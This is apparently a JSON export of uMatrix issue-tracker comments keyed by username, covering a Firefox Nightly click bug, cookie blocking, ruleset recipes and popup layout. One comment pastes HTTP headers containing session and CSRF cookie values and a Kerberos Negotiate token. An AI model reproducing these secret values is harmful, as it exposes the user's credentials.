    "cajopa": "This does not appear to be related to #912: there is no garbling and there are no iframes. I am using HTTPS though can't test whether it occurs with HTTP, since I am using the SPNEGO plugin for nginx, and it only functions with SSL on. Request and response data below.\nGeneral\nRequest URL:https://auth.xxx.com/\nRequest Method:GET\nStatus Code:302 FOUND\nRemote Address:209.86.xxx.xxx:443\nReferrer Policy:no-referrer-when-downgrade\nResponse Headers\nConnection:keep-alive\nContent-Type:text/html; charset=utf-8\nDate:Tue, 06 Mar 2018 23:02:24 GMT\nLocation:https://auth.xxx.com/user/login?next=https://auth.xxx.com/\nServer:nginx/1.12.2\nSet-Cookie:sessionid=; expires=Thu, 01-Jan-1970 00:00:00 GMT; Max-Age=0; Path=/\nTransfer-Encoding:chunked\nWWW-Authenticate:Negotiate oYGxMIGuoAMKAQChCwYJKoZIgvcSAQICooGZBIGWYIGTBgkqhkiG9xIBAgICAG+BgzCBgKADAgEFoQMCAQ+idDByoAMCAReiawRpDl1tK8FGwCM8h/bYFMkr10BVaiss3uOI7Ty2ArOmi/9CAKtRZ3gT5P1NnhSxPFn0pZBFQSXm1I96hNGdLlcvVepxrZcvMj6wutPJrksiNUfSRKWTVddKL4JhTTGTe7I0FslBHT3+o94=\nX-Frame-Options:SAMEORIGIN\nRequest Headers\nAccept:text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,/;q=0.8\nAccept-Encoding:gzip, deflate, br\nAccept-Language:en-US,en;q=0.9\nCache-Control:no-cache\nConnection:keep-alive\nCookie:csrftoken=K8arK0kKyMEQCWEUFeq2AftL4og2jC5G; sessionid=2jsiguxaiewwz84tks3m7153h8d40gj2\nDNT:1\nHost:auth.xxx.com\nPragma:no-cache\nUpgrade-Insecure-Requests:1\nUser-Agent:Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36. My apologies - I actually did see the workaround mentioned, but forgot to try it. I just tried it, and it seems to address the issue completely.\nAlso, I did take a look at the logger before submitting this bug and didn't learn anything new, so didn't mention it, to reduce noise. It just showed that the initial request occurred, which from the Dev Console I knew resulted in a 302 as expected, but then that no subsequent request was made by the browser in response. A couple cookie records appeared after that, and then nothing.\nAnyway, since the workaround worked, I'm closing this bug report. Thank you for your help.. ",
    "wavexx": "On Thu, Mar 08 2018, Raymond Hill wrote:\n\nWhat you ask is out of scope of uMatrix. If you are using Firefox, try a filter such as\nreddit.com##^script.\n\nI guess using uBlock?\n. ",
    "kasiub": "I also have the same issue (only difference is Windows 10 not 7).. ",
    "Porkepix": "Reproduced on Archlinux too, latest Nightly. Can check on a mac this evening.\nQuestion is, did it broke on the addon update or Nightly's update.. @korpjack or @gorhill This issue should probably be closed then?. ",
    "JW-IT": "same problem win10-64bit, nightly 61.0a1-64bit\nno clicks registered on the drop-down interface of umatrix\nall the site specifc configurations work (blocking stuff on one domain and allowing stuff on another),\nbut no change is possible\nand i am pretty sure, that there was no addon update, but the nightly's update is the culprit\nEDIT: just noticed, that uBlock has the same problem, will open a issue there and reference this one\nsee https://github.com/gorhill/uBlock/issues/3605. can confirm, latest nightly update fixed this\nwin10 (64bit), Nightly 61.0a1 (2018-03-15) (64-bit). ",
    "Hoerli1337": "Same here with Win10 64bit and Nightly 64bit 61.0a1 (2018-03-14).\nTested with 2 systems.. ",
    "0re5ama": "same here with arch linux and Nightly.. ",
    "davidjb": "The issue has just been fixed according to the Bugzilla bug; guess we'll see when the next Nightly comes out.  Nightly starts building twice a day at 10:00 and 22:00 UTC so it's not long away.. FF Nightly update just installed has fixed the issue on uMatrix/uBlock Origin for me; 61.0a1 (2018-03-15) (64-bit) on Mac 10.13.3. \ud83c\udf89 . ",
    "korpjack": "Issue has been resolved by the latest update in Nightly.\nhttps://hg.mozilla.org/mozilla-central/rev/6ed4300a066b. I could be wrong, but it looks like both sides of the rules (perma and temp) are the same. Are they? If they are nothing would change.. I am using Firefox (no issues), but I took a look at the source and the mechanism that toggles those buttons' visibility is done this way:  uDom('#diff').toggleClass('dirty', response.temporaryRules !== response.permanentRules); \nThe toggleClass adds or removes the dirty class from the container div. To debug this in chrome, one could check if this class name gets added/removed with each click by using inspect-element, and proceed from there.\n. ",
    "nailyk-fr": "Wanna say the same. \nFixed here on 61.0a1 (2018-03-18) on devuan ascii. . ",
    "joonatoona": "Sorry, it appears to be an issue with Firefox, chrome.tabs.query({ active: true, currentWindow: true }); doesn't seem to respect focus.\nAlthough for some reason, uBlock Origin doesn't seem to be affected, even though it seems to use the same API?. ",
    "AsmoAeon": "Happens to me too but the new sites must be opened from the favorites bar to the current tab.\nOpen to new tabs or shift-clicks or typing the url etc does not reproduce the effect.\n(Google Chrome Version 65.0.3325.162 (Official Build) (64-bit) on windows 10). Still happens for me and now the versions are different.\n\numatrix 1.3.10\nChrome Version 67.0.3396.87 (Official Build) (64-bit)\nWindows 10 Home (Version 1803)\nFor example if i visit kernel.org after facebook.com i will see the facebook too as seen in the pic. ",
    "talklittle": "I had this problem when Firefox (59.0.1) auto-updated from uMatrix 1.3.2 to 1.3.4.\nSolved by exporting rules to a file, editing and deleting all rules, then re-importing the rules from the file.\nMaybe some rule formatting difference going from 1.3.2 to 1.3.4, e.g. trailing whitespace?. New commit d825b5562e9914627056d76be65c991c75280ba9 changes the UI of that page significantly. Would need to figure out how CodeMirror API works to redo the PR, and no indication maintainer even cares about this feature.. ",
    "HuMuK": "Already reported. ",
    "over9001": "This bugged me too, as a new user starting today, I thought I would try to give back a little.\nLet me submit a pull request.. I have made this change, and stand ready to receive further guidance.\n:). ",
    "zippy5": "@Rictusempra, would you consider adding/converting these as recipes as well? I think they would be a great addition to that :)\nMore info:\nhttps://github.com/gorhill/uMatrix/wiki/Contributing-ruleset-recipes\nhttps://github.com/gorhill/uMatrix/releases. Hi @Rictusempra, it's a fairly new feature that's been added to uMatrix.  From the release page:\n\n[Status: experimental] A new button (\"puzzle\" piece icon) is available in the popup panel: uMatrix will offer you the ability to import community-contributed ruleset recipes which are relevant to the current page (see #30). Hopefully there will be many contributions to populate ruleset recipes ready to be used to unbreak sites.\n\nInstead of being added as a filter list, they're \"recipes\" that you can toggle on from the puzzle piece icon within the uM popup.  They are added as temporary rules, so each user can use it to quickly unbreak a site, but they can also be quickly modified via the UI and then made permanent or erased via the eraser/lock buttons.  \nHere's the current recipes available:\nhttps://github.com/uBlockOrigin/uAssets/blob/master/recipes/recipes_en.txt. I could be mistaken, but...\nto me it looks like you're trying to import them as \"recipes,\" but the content found at \nhttps://raw.githubusercontent.com/uMatrix-Rules/uMatrix-Rules-Domain/master/rules.txt\nare in the format of filters, not the syntax for recipes.  . You likely set privacy.resistFingerprinting to true.\nYou can still download it from AMO, manually install it, or temporarily turn off the setting.\nRegardless, you should look into what settings do before you change them. . ",
    "deinopppa": "Well as i said my english is not the yellow from the egg, but thx for the fast answer.\nThis is how i made a solution with i can go for it:\n\nfonts.googleapis.com frame allow\nfonts.googleapis.com script allow\nfonts.googleapis.com xhr allow\nggpht.com frame allow\nggpht.com script allow\nggpht.com xhr allow\ngoogle.com frame allow\ngoogle.com script allow\ngoogle.com xhr allow\ngoogle.de frame allow\ngoogle.de script allow\ngoogle.de xhr allow\ngooglevideo.com frame allow\ngooglevideo.com script allow\ngooglevideo.com xhr allow\ngstatic.com frame allow\ngstatic.com script allow\ngstatic.com xhr allow\nmaps.googleapis.com frame allow\nmaps.googleapis.com script allow\nmaps.googleapis.com xhr allow\nytimg.com frame allow\nytimg.com script allow\nytimg.com xhr allow\n\nWell, yeah.... should be fine so :D. ",
    "MPeti1": "Since i use Firefox beta on PC, i tried out Firefox beta on android, but it's the same. ",
    "Gyokur0": "@Thorin-Oakenpants thanks for the info.. Hi gorhill!\nPerhaps I described it too complicated, of course it should stay near the scope selector, but the actions for save, revert and reload should be more together. \nIn the popup.html the line with id=buttonRecipes should be simply be moved up two lines between buttonMtxSwitches and buttonPersist.\n\n. That makes totally sense, this is even better.\nThe icons on the left are used seldom or should with thought, e.g. you'd be sure what you are doing if you change the scope to the wildcard star, or even disable uMatrix completely, the other two are used more rarely.\nThe stuff on the right is used far more often. \nFrom my perspective I have strict base rules, so on every new unknown site, I have to enable and reload (more than once if a lot of external content is there). If I like the site I hit the lock. More rarely I hit the eraser, often in experimenting with video in pages. I never have used the revert all button (I just closed the browser)\nI'm not sure if putting the reload button directly next to the revert all is a good idea (which is a destructive action, that also affects more than one page). \nI tried to optimize this in version 1 in the mockup.\nIn the second version I switched lock and erase since I use lock and reload more often together. (But I'm also aware undoing an accidental lock click is more complicated that undoing a eraser click)\n\nThis is based on my experience and usage and I certainly cannot speak for everyone.\nThe only thing I want is that the gap between reload and lock is not so large, so every presented solution is better than the status quo ;) \n. For me @gorhill has fixed it with 5dd6564b6a553feebdbaaae0db1526d614021ce3 . ",
    "guakamole": "+1\nI'll add that sites can write cookies even though they are blocked in the matrix. Note that it seems to be related to first party cookies only (third party are blocked by firefox anyway so I can't tell).\nFirefox 61.0a1 and uMatrix 1.3.4.. Thank you for your answers.\nI didn't know that cookies are actually allowed to be written. This is quite counter-intuitive. When I block something in the matrix, I would expect for it to be... blocked. And if people want to inspect what is going on (as stated in the doc), free for them to temporarily unblock the domain in the matrix.\nThere is still a problem somewhere anyway, even with the \"Delete blocked cookies\" option checked, cookies never get deleted. Here are my settings:\n\nBy the way, what is up with the 15min limit ? Why can't I set it to 5 or 10min ?. ",
    "GeographicCone": "\nI've tried finding more ways to block cookies\n\nCookie-AutoDelete works great for me with uMatrix and uBlock Origin:\nhttps://github.com/Cookie-AutoDelete/Cookie-AutoDelete\n. ",
    "GITMichaelK": "Thank you, perfect solution.. ",
    "Massedil": "In the address bar, the URL is still https://aaa.bbb.ccc.net/mantis/view.php?id=1108.\nMay be because of the XHR GET https://aaa.bbb.ccc.net/mantis/view.php?id=1108 seen in the logs to reload the webpage with new content POSTed with XHR just before ?. "
}